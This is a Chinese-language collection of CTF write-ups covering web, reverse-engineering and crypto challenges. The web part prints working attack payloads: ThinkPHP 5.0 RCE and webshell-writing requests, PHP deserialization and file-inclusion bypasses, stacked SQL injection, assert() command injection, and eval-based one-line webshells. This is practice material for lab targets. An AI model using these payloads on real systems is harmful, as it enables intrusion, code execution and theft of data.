        echo @highlight_file($this->file, true); //高亮显示出fl4g.php文件
    }
    function __wakeup() { //需要绕过wakeup函数
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); //传入参数var先base64解码
    if (preg_match('/[oc]:\d+:/i', $var)) { //过滤匹配
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?> 
```

__wakeup()函数正则匹配这里匹配的是O:4，我们用O:+4即可绕过，本地构造脚本：

```php
<?php
class Demo { 
    private $file = 'fl4g.php';
}
$a= new Demo();
$b=serialize($a);
$b=str_replace('O:4','O:+4',$b);
$b=str_replace('1:{','2:{',$b);//当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。
echo $b;
echo base64_encode($b);
?>
```

ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}

#### 3-Web-php_rce

**题目描述：**

想想初始页面是哪个

**题目思路：**

ThinkPHP官方2018年12月9日发布重要的[安全更新](https://blog.thinkphp.cn/869075)，修复了一个严重的远程代码执行漏洞，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本

漏洞成因具体可以看该博客：https://www.cnblogs.com/backlion/p/10106676.htm

**解题过程**：

先查看版本号。在网址上随意输入一个不存在的模块地址：

http://{ip}/index.php/login

可以看到，thinkphp版本为5.0.20

方法一：

列出当前目录所有文件

```php
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```

查找flag

```php
?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name "*flag"
```

显示flag

```php
?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

方法二：

写入shell

```php
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=test.php&vars[1][]=<?php highlight_file(__FILE__);@eval($_POST[sss]);?>
```

菜刀连接

flag{thinkphp5_rce}

#### 4-Web-Web_php_include

**题目思路：**

题目源码中试图过滤php://伪协议以及调用include($page)，这实际上是在提示：利用PHP伪协议+文件包含。

**解题过程**：

方法一：

审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。

```php
 <?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

题目给了源码，根据提示知道是文件包含，分析源码可以发现php://被过滤了，可以绕过php://伪协议过滤的有data://伪协议。查找flag

```php
?page=data://text/plain,?page=data://text/plain,<?system('ls');?>
```

显示flag,查看源码得到flag

```php
?page=data://text/plain,?page=data://text/plain,<?system('cat fl4gisisish3r3.php');?>
```

![img](https://adworld.xctf.org.cn/media/uploads/writeup/67629cb2974511ea88a9fa163e3c3fd2.png)

方法二：

用御剑(D:\CTF\web\御剑后台扫描珍藏版\御剑后台扫描珍藏版\御剑后台扫描工具.exe)扫描后台发现phpmyadmin后台，双击它进入登录页面username:root    password为空,之后并进入SQL语句输入的地方，编辑一句话木马并执行

```php
select "<?php eval($_POST[cmd]);?>"  into outfile '/tmp/1.php'
```

打开中国蚁剑输入url地址(ip:xxxx/?page=/tmp/1.php)和密码(cmd)，加密方式base64，测试连接成功之后，我们就可以发现flag在www目录下面，之后双击打开

![img](https://adworld.xctf.org.cn/media/uploads/writeup/20c7cecad91e11e99f5400163e004e93.png)

ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

#### 5-Web-Web_supersqli

**题目来源：**

强网杯 2019

**题目描述：**

随便注

**题目场景：**

111.200.241.244:58382

**题目思路：**

MySQL表名为纯数字时要加单引号：show columns from '1919810931114514'，MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT，也就是预处理语句，字符拼接函数concat

**解题过程**：

输入单引号出现错误，然后1’ #显示正常，存在注入，数据库类型是MariaDB

![img](https://img2020.cnblogs.com/blog/832604/202004/832604-20200403163637422-2066556104.png)

union联合查询，发现select被过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527205644889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pY2VzYQ==,size_16,color_FFFFFF,t_70)

这里可以执行多sql语句，所以可以采用堆叠查询，1';闭合成功然后执行sql指令最后注释后面的代码，查询表名，结果如下：

![img](https://img2020.cnblogs.com/blog/832604/202004/832604-20200403173057847-1586082240.png)

查询表名中的列名，结果如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527210256778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pY2VzYQ==,size_16,color_FFFFFF,t_70)

查看值，需要绕过select的限制，可以使用预编译的方式，还需要concat绕过关键字的检查。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527210713955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pY2VzYQ==,size_16,color_FFFFFF,t_70)

这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，将set和perpare大写即可。

```mysql
1';sEt @sql = concat('sele','ct * from `1919810931114514`;');prePare aaa from @sql;EXECUTE aaa;#
```

flag{c168d583ed0d4d7196967b28cbd0b5e9}

#### 6-Web-web2

**题目来源：**

NSCTF

**题目描述：**

解密

**题目场景：**

111.200.241.244:57392

**题目思路：**

题目给了加密算法和加密后的字符串，需要我们自己实现解密，加密方式：1.反转，2.取出每一位ascii+1，3.base64，4.反转，5.rot13

**解题过程**：

访问网站得到

```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
function encode($str){
    $_o=strrev($str);// echo $_o;   
    for($_0=0;$_0<strlen($_o);$_0++){
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}
highlight_file(__FILE__);/*逆向加密算法，解密$miwen就是flag*/
?> 
```

- strrev(string): 反转字符串
- substr(string, start, length): 返回字符串的一部分
  - string: 所需要的字符串
  - start: 在字符串何处开始
  - length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾
- ord(string): 返回字符串首个字符的 ASCII 值
- chr(): 从指定的 ASCII 值返回对应的字符
- str_rot13(string): 对字符串执行 ROT13 编码。
  - ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变
  - 编码和解码都是由该函数完成的。如果把已编码的字符串作为参数，那么将返回原始字符串
- base64_encode(string): 使用 MIME base64 对数据进行编码

分析题目中的函数

1. 循环开始：给encode一个参数 `$str`
2. 将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 `$_o`
3. 循环遍历 变量 `$_o`每次取出一位赋值给`$_c`
4. 将变量`$_c` 转化为 ASCII码 并 +1，赋值给 `$__`
5. 将 `$__` 转化为该ASCII码所对应的字符，赋值给 `$_c`
6. 拼接字符串，赋值给 `$_`, 循环结束。
7. 将拼接好后的字符串 `$_`进行 base64编码，然后反转字符串，然后进行 rot13 加密
8. 得出结果为 $miwen

```php
<?=
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
function decode($str){
    $flag='';
    $str=base64_decode(strrev(str_rot13($str)));
    for ($_0=0; $_0 <strlen($str); $_0++) {
        $_c=substr($str,$_0,1);
        $__=ord($_c)-1;
        $_c=chr($__);
        $flag=$flag.$_c; 
    } 
    return strrev($flag);
}
echo decode($miwen);
?>
```

flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}

#### 7-Web-warmup

**题目思路：**

代码审计

**解题过程**：

打开题目，f12发现：

```
<!--source.php-->
```

访问hint.php：

```
flag not here, and flag in ffffllllaaaagggg
```

看到source.php，发现源代码:

```php
 <?php
    highlight_file(__FILE__);
    class emmm{
        public static function checkFile(&$page){
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {//要求$page为字符串
                echo "you can't see it";
                return false;
            }
            if (in_array($page, $whitelist)) {//判断$page是否存在于$whitelist数组中
                return true;
            }
            $_page = mb_substr($page,0,mb_strpos($page . '?', '?'));//截取$page中'?'前部分，若无则截取整个$page
            if (in_array($_page, $whitelist)) {//判断截取后的$page是否存在于$whitelist数组中，截取$page中'?'前部分
                return true;
            }
            $_page = urldecode($page);//url解码$page
            $_page = mb_substr($_page,0,mb_strpos($_page . '?', '?'));
            if (in_array($_page, $whitelist)) {//判断url解码并截取后的$page是否存在于$whitelist中
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file'])) {//$_REQUEST['file']值非空,$_REQUEST['file']值为字符串,能够通过checkFile函数校验
        include $_REQUEST['file'];//包含ffffllllaaaagggg文件
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

此题的正确思路应该是走最后一个if语句返回true得到flag，先进行url解码再截取（``'?'``两次编码值为``'%253f'``），构造payload

```php
?file=hint.php%253f/../../../../ffffllllaaaagggg
```

source.php?是一个目录，但解析时不会验证这个目录是否真的存在，成功获取flag：

flag{25e7bce6005c4e0c983fb97297ac6e5a}

#### 8-Web-NaNNaNNaNNaN-Batman

**题目思路：**

javascript的代码审计、正则表达式

**解题过程**：

下载文件,内容是这样的：
![img](https://img-blog.csdnimg.cn/20190413151847977.png)

 脚本语言,是html文件,修改后缀用浏览器打开得到：
![img](https://img-blog.csdnimg.cn/20190413151933585.png)

是一个输入框,看来我们要先弄清楚这个文件的代码才行,审计代码可以看到最开始的下划线“_”是一个变量,其内容是一个函数的代码,而最后又是一个eval(_),也就是执行这个函数了,我们把eval改为alert,让程序弹框,得到了源码的非乱码形式：
![img](https://img-blog.csdnimg.cn/20190413152211156.png)

 把得到的代码整理一下就是：

```php
function $(){
var e=document.getElementById("c").value;
if(e.length==16)
	if(e.match(/^be0f23/)!=null)
		if(e.match(/233ac/)!=null)
			if(e.match(/e98aa$/)!=null)
				if(e.match(/c7be9/)!=null){
					var t=["fl","s_a","i","e}"];
					var n=["a","_h0l","n"];
					var r=["g{","e","_0"];
					var i=["it'","_","n"];
					var s=[t,n,r,i];
					for(var o=0;o<13;++o){
						document.write(s[o%4][0]);s[o%4].splice(0,1)
						}
					}
				}
				document.write('<input id="c"><button οnclick=$()>Ok</button>');
				delete 
```

不用根据这些个变量和document.write去算flag,拿到flag有两种方法：

1）满足正则

只要e的规则符合长度为16并且以be0f23开头以e98aa结尾并且需要匹配233ac和c7be9即可.

首先,满足length==16,正则的话^为开始符号,$为结尾符号,拼接一下：be0f233ac7be98aa,输入就拿到flag了。

2）将下面这段拿到控制台执行一下即可：

```
var t=["fl","s_a","i","e}"];
var n=["a","_h0l","n"];
var r=["g{","e","_0"];
var i=["it'","_","n"];
var s=[t,n,r,i];
for(var o=0;o<13;++o){
	document.write(s[o%4][0]);s[o%4].splice(0,1)
	}
}
```

flag{it's_a_h0le_in_0ne}

#### 10-Web-upload1

**题目思路：**

直接删掉js前端的过滤,上传一句话菜刀连接

**解题过程**：

f12,把οnchange="check();"删了![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223343614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODg0NzI3,size_16,color_FFFFFF,t_70)

上传一句话,D:\CTF\web\1.Php,密码是cmd

```php
<?php @eval($_POST['cmd']);?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223427988.png)

把上传路径复制一下,前面加上ip+端口,打开菜刀,D:\CTF\web\caidao,每次容器的密码不同

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223453791.png)

cyberpeace{d8d5d509616f061ecee7f924054ba441}

#### 17-Web-mfw

**题目来源：**

csaw-ctf-2016-quals

**题目场景：**

111.200.241.244:55286

**题目思路：**

git源码泄露，命令执行

**解题过程**：

1.打开题目后，点击About页面，发现网站使用Git、PHP、Bootstrap搭建而成，访问ip/.git，发现存在源码泄露。

2.使用[GitHack](https://github.com/lijiejie/GitHack)工具，使用命令`python2 GitHack.py http://111.200.241.244:55286/.git/`我们可以得到网站的源码。

3.查看源码中的flag.php文件，其中并没有flag，审计index.php文件，关键代码如下

```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");#assert()函数会将括号中的字符当成代码来执行，并返回true或false。
// TODO: Make this look nice
//strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False
assert("file_exists('$file')") or die("That file doesn't exist!");#检查文件或目录是否存在。
?>
```

page参数是GET请求获取的，而且没有做任何处理，可以用它构造代码让assert函数去执行，例如：payload:`?page=abc') or system("cat templates/flag.php");//`。这样$file最终会是`templates/abc') or system("cat templates/flag.php");//.php`。因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用" // "将后面的语句注释掉，最终assert执行如下（flag在注释里，要右键查看源代码才能看到）：

```php
assert("strpos('templates/abc') or system("cat templates/flag.php");//.php', '..') === false")
```


 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019050604563667.png)

cyberpeace{7e024fa4227681f1d71f30404f1cbe2f}

#### 21-Web-ics-04

**题目描述：**

工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。

**题目思路：**

1. 忘记密码页面findpwd.php存在SQL注入
2. 注入成功拿到账号
3. 登录账号得到flag

**解题过程**：

1.打开站点发现主要功能有：登录、注册、找回密码

2.刚开始帐号密码都没有，不可登录。注册一个test，在找回密码页面，使用hackbar在post里填username=test，发送后发现页面变化，判断存在POST类型注入，注入点为username。

3.使用sqlmap进行注入,得到cetc004库。

```python
python3 sqlmap.py -u "http://220.249.52.133:49651/findpwd.php" --data="username=test" --dbs
```

user表

```python
python3 sqlmap.py -u "http://220.249.52.133:49651/findpwd.php" --data="username=test" -D "cetc004" --tables
```

answer、password、question、username列

```python
python3 sqlmap.py -u "http://220.249.52.133:49651/findpwd.php" --data="username=test" -D "cetc004" -T "user" --dump
```

4。查看具体信息，得到

用户名  c3tlwDmIn23

密码    1qazWSXED56yhn8ujm9olk81wdfTG

问题    cetc

5.进入注册页面，注册注入得到的用户名（用户名和密码填对即可），就可以用该账户去登录，得到flag

cyberpeace{fe617ee23d8f45e681d79625931a5efc}

### web-i-got-id-200

 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190620125046682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3NDMzMDAw,size_16,color_FFFFFF,t_70)
 直接跳到文件会有一个上传,但它会将上传的内容显示出来
 哦们可以猜测他的php代码（前面还有提示哦）

```
​```perl use strict; use warnings; use CGI;
my $cgi= CGI->new; 
if ( $cgi->upload( 'file' ) ) 
{ my $file= $cgi->param( 'file' ); 
while ( <$file> ) 
{ print "$_"; 
} } 
12345678
```

那么,这里就存在一个可以利用的地方,param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说,如果我们传入一个ARGV的文件,那么Perl会将传入的参数作为文件名读出来。这样,我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV,然后在URL中传入文件路径参数,这样就可以读取任意文件了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190620125956801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3NDMzMDAw,size_16,color_FFFFFF,t_70)
 这里还可以猜flag的比如
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190620125624694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3NDMzMDAw,size_16,color_FFFFFF,t_70)
 /bin/bash%20-c%20ls*I**F**S*/∣/*b**i**n*/bashIFS/∣/bin/bash{IFSwen}/flag|



### REVERSE

#### 1-Rerverse-answer_to_everything

**题目来源：**

2019_ISCC

**题目描述：**

sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。注意：将得到的flag变为flag{XXX}形式提交。

**题目附件：**

[a36a093669e6419382fe1c4a185a4694.zip](https://adworld.xctf.org.cn/media/task/attachments/a36a093669e6419382fe1c4a185a4694.zip)

**题目思路：**

用IDA 打开，发现not_the_flag函数中有密码，结合题目进行sha1运算

**解题过程：**

解压后打开是一个exe文件，但是无法运行，那就用IDA64打开

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h]
  printf("Gimme: ", argv, envp);
  __isoc99_scanf((__int64)"%d", (__int64)&v4);
  not_the_flag(v4);
  return 0;
}
```

有一个可疑的not_the_flag函数，进去翻译一下英文，Bill提交的没有标签的密码

```c++
__int64 __fastcall not_the_flag(int a1){
  if ( a1 == 42 )
    puts("Cipher from Bill \nSubmit without any tags\n#kdudpeh");
  else
    puts("YOUSUCK");
  return 0LL;
}
```

那么密码就是后面的kdudpeh，结合题目[在线sha1](http://www.ttmd5.com/hash.php)

flag{80ee2a3fe31da904c596d993f7f1de4827c1450a}

### Reverse-key

有很多函数 还有指令其实感觉 用od  或者ida 直接静态 就能查出来什么意思 就没有必要 去深究 里面的算法

点进去 主要的函数 

![img](https://img-blog.csdnimg.cn/20190424201033661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

发现了这个东西  注意这个  Memory 这个东西  我们往下看

![img](https://img-blog.csdnimg.cn/2019042420111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

这里 决定了我们的走向他就是参数之一  然后我们我们 发现 如果直接 运行程序 会失败  原因就是 他这个是 读取的 txt

![img](https://img-blog.csdnimg.cn/20190424201237531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

我们在路径下  直接建立一个文件就行 然后 写上pwn   然后我们分析一下sub_4020C0 这个函数

![img](https://img-blog.csdnimg.cn/20190424201335794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

 这里的v7 应该就是我们的 memory  但和他比较的 并不是很确定是不是我们的 file文件 我们用od 来调试一下

![img](https://img-blog.csdnimg.cn/2019042420142335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

emmmmm    直接出来flag 了  如果想 用程序解密的话 下面是脚本

idg_cni~bjbfi|gsxb

```
str1 = "themidathemidathemida"
str2 = ">----++++....<<<<."

key =""
flag=""
for i in range(18):
	key += chr((ord(str1[i]) ^ ord(str2[i]))+22)
for i in key:
	flag+=chr(ord(i)+9)
print(flag)
```

### Reverse-re1-100

![img](https://img-blog.csdnimg.cn/20190425164612108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)看着一部分可能会看的有点晕 

这里应该是 反调试 +多进程  还是比较可惜的

我们直接看我们输入的字符 它是怎么处理的

![img](https://img-blog.csdnimg.cn/20190425164718341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

这里就可以看出来是 42个字符  {}  这样格式的

然后看一下  经过的函数

![img](https://img-blog.csdnimg.cn/20190425164749548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

就是换字符而已。

```
#!/usr/bin/python3
#coding=utf8
 
from Crypto.Util.number import long_to_bytes,bytes_to_long
if __name__ =='__main__':
	#l=""
	#flag="53fc275d81053ed5be8cdaf29f59034938ae4efd"
	str1="daf29f59034938ae4efd53fc275d81053ed5be8c"
	print(str1[20:30],end='')
	print(str1[30:],end='')
	print(str1[:10],end='')
	print(str1[10:20],end='')
```

得出flag

### Reverse-zorropub

要求我们输入drinks的数量和drinks的id,通过检查之后,和一串MD5密文比较,如果对的话就给flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190730111243664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25vY2J0bQ==,size_16,color_FFFFFF,t_70)

可以看到我们输的ids要满足大于16,小于0xffff,还要满足v9=10；
v9也跟我们输的ids有关系,逆ids的话不好逆,只能爆破了。

这里我用pwntools库写的脚本,但花费的时间比较长,我看网上还有用subprocess库写的脚本,跑的比较快,拿过来对比一下。

```
import subprocess
import time
time1=time.time()

a=[]

for i in range(16,0xffff):

v9=0

j=i

while(i):

​    v9=v9+1

​    i=i&(i-1)

​    if v9==10:

​        a.append(j)



for i in a:

proc = subprocess.Popen(['./zorro_bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

out = proc.communicate(('1\n%s\n' % i).encode('utf-8'))[0]

if "nullcon".encode('utf-8') in out:

  print(out)
  print "ids=",i
  time2=time.time()
  print "cost time: %fs"%(time2-time1)

  break
```

​        ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190730112657125.png)

### Reverse-secret-galaxy-300

这个题  。。。。  没有硬核分析算法  不过结构体 应该挺好分析的

![img](https://img-blog.csdnimg.cn/20190429101128688.png)

主函数就这么多的东西  然后我们看一下两个函数的内容

![img](https://img-blog.csdnimg.cn/20190429101155381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70) 

![img](https://img-blog.csdnimg.cn/20190429101205243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

看起来 。。。 好像没有什么问题    然后 到后面结构体里面的值就直接打印了出来 

我用od 看了一下 结构体里面的内存 发现了一个可疑的字符串

![img](https://img-blog.csdnimg.cn/20190429101322411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDcxNjQ2,size_16,color_FFFFFF,t_70)

交上去 就是正确答案

### CRYPTO

#### 1-crypto-告诉你个秘密

**题目思路：**

先十六进制转字符串,再base64解密,最后得到r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM ,通过观察键盘,被这些圈起来的字符组成了flag

**解题过程**:

下载文件,得内容如下：
*636A56355279427363446C4A49454A7154534230526D6843*
*56445A31614342354E326C4B4946467A5769426961453067*

16进制转换成字符串：
cjV5RyBscDlJIEJqTSB0RmhC
VDZ1aCB5N2lKIFFzWiBiaE0g

base64解码：
r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM

键盘加密,这些字母的键盘圈住的就是flag

TONGYUAN

#### 2-crypto-Broadcast

**题目描述：**

粗心的Alice在制作密码的时候,把明文留下来,聪明的你能快速找出来吗？

**题目思路：**

解压文件在py文件中有flag明文

**解题过程**:

打开py文件,得内容如下：

```python
#!/usr/bin/env python3
from Crypto.Util import number
from Crypto.PublicKey import RSA
from hashlib import sha256
import json

#from secret import msg
msg = 'Hahaha, Hastad\'s method don\'t work on this. Flag is flag{fa0f8335-ae80-448e-a329-6fb69048aae4}.'
assert len(msg) == 95

Usernames = ['Alice', 'Bob', 'Carol', 'Dan', 'Erin']
N = [ ( number.getPrime(1024) * number.getPrime(1024) ) for _ in range(4) ]
PKs = [ RSA.construct( (N[0], 3) ), RSA.construct( (N[1], 3) ), RSA.construct( (N[2], 5) ), RSA.construct( (N[3], 5) ) ]

for i in range(4):
    name = Usernames[i+1]
    open(name+'Public.pem', 'wb').write( PKs[i].exportKey('PEM') )

    data = {'from': sha256( b'Alice' ).hexdigest(),
            'to'  : sha256( name.encode() ).hexdigest(),
            'msg' : msg
            }
    data = json.dumps(data, sort_keys=True)
    m = number.bytes_to_long( data.encode() )

    cipher = pow(m, PKs[i].e, PKs[i].n)

    open(name+'Cipher.enc', 'wb').write( number.long_to_bytes(cipher) )
```

flag{fa0f8335-ae80-448e-a329-6fb69048aae4}

#### 3-crypto-cr3-what-is-this-encryption

**题目描述：**

Fady同学以为你是菜鸟，不怕你看到他发的东西。他以明文形式将下面这些东西发给了他的朋友  p=0xa6055ec186de51800ddd6fcbf0192384ff42d707a55f57af4fcfb0d1dc7bd97055e8275cd4b78ec63c5d592f567c66393a061324aa2e6a8d8fc2a910cbee1ed9  q=0xfa0f9463ea0a93b929c099320d31c277e0b0dbc65b189ed76124f5a1218f5d91fd0102a4c8de11f28be5e4d0ae91ab319f4537e97ed74bc663e972a4a9119307  e=0x6d1fdab4ce3217b3fc32c9ed480a31d067fd57d93a9ab52b472dc393ab7852fbcb11abbebfd6aaae8032db1316dc22d3f7c3d631e24df13ef23d3b381a1c3e04abcc745d402ee3a031ac2718fae63b240837b4f657f29ca4702da9af22a3a019d68904a969ddb01bcf941df70af042f4fae5cbeb9c2151b324f387e525094c41  c=0x7fe1a4f743675d1987d25d38111fae0f78bbea6852cba5beda47db76d119a3efe24cb04b9449f53becd43b0b46e269826a983f832abb53b7a7e24a43ad15378344ed5c20f51e268186d24c76050c1e73647523bd5f91d9b6ad3e86bbf9126588b1dee21e6997372e36c3e74284734748891829665086e0dc523ed23c386bb520 他严重低估了我们的解密能力

**题目思路：**

16进值->10进值->使用py脚本->m->16进值->字符

**解题过程**:

简单的RSA解密题，网上可以找到很多代码。先通过(https://tool.lu/hexconvert/)把q,p,e,c的值转化成10进值，然后替换代码(D:\CTF\Crypto\编码与密码\密码\RSA\nepqc解m.py)中的值，把n改成n=q*p放在后面

```python
# -*-  coding:utf8 -*-
__author__='pcat@chamd5.org'
import libnum
import gmpy2
e=76629781387397242664311670987431757827144139255639280752983416867031015307352014386648673994217913815581782186636488159185965227449303118783362862435899486717504457233649829563176353949817149997773276435581910370559594639570436120596211148973227077565739467641309426944529006537681147498322988959979899800641
p=8695224115036335558506571119739296036271134788610181138168484331081777972517240308721981280176995392696427341397469232176120700610749965333026113898553049
q=13096749823995628078930936161926731366955083380107539950861609990671457149850288846976369982960384583841424977220385144435351119887497145134804975486079751
n=q*p
c=89801389443569569957398406954707598492763923418568536030323546088278758362331043119736437910117697032594835902900582040394367480829800897231925233807745278389358031404278064633313626149336724945854865041439061149411962509247624419448003604874406282213609341704339025169015256228029200222643343430028828063008
d=gmpy2.invert(e,(p-1)*(q-1))
m=pow(c,d,n)
print (m)
```

解出来的值转化成16进值(https://tool.lu/hexconvert/)：

```
414c45584354467b5253345f49355f453535454e5431414c5f54305f44305f42595f48344e447d
```

然后使用字符转换工具(D:\CTF\Crypto\编码与密码\万能字符转换Character1.2.exe)16进值转化成字符，得到flag

ALEXCTF{RS4_I5_E55ENT1AL_T0_D0_BY_H4ND}

#### 4-crypto-flag_in_your_hand

**题目思路：**

首先借助浏览器来运行js 程序。用浏览器打开`index.html`，分析 js 代码: 首先无论在 token 输入框中输入什么字符串，`getFlag()` 都会算出一个 hash 值， 实际上是`showFlag()`函数中 ic 的值决定了 hash 值即 flag 是否正确。那么在`script-min.js`中找到 ic 取值的函数 ck() ，找到一个 token 使得 ck()中`ic =true`即可。token 是`[118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,120]`每个数字减3 得到的ascii 码所对应的字符

**解题过程**:

查看js文件，找到ck函数，应该是check的缩写

```javascript
function ck(s) {
    try {
        ic
    } catch (e) {
        return;
    }
    var a = [118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,120];
    if (s.length == a.length) {
        for (i = 0; i < s.length; i++) {
            if (a[i] - s.charCodeAt(i) != 3)
                return ic = false;
        }
        return ic = true;
    }
    return ic = false;
}
```

要使ic为true才可以绕过，a[i] - s.charCodeAt(i) == 3，也就是将每个数减3得到字串，脚本如下：

```python
a=[118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,120]
s=''
for i in a:
    i=i-3
    s+=chr(i)
print(s)
```

得到token为：security-xbu进入index文件输入token即可得到flag

RenIbyd8Fgg5hawvQm7TDQ

#### 5-crypto-banana-princess

**题目来源：**

bitsctf-2017

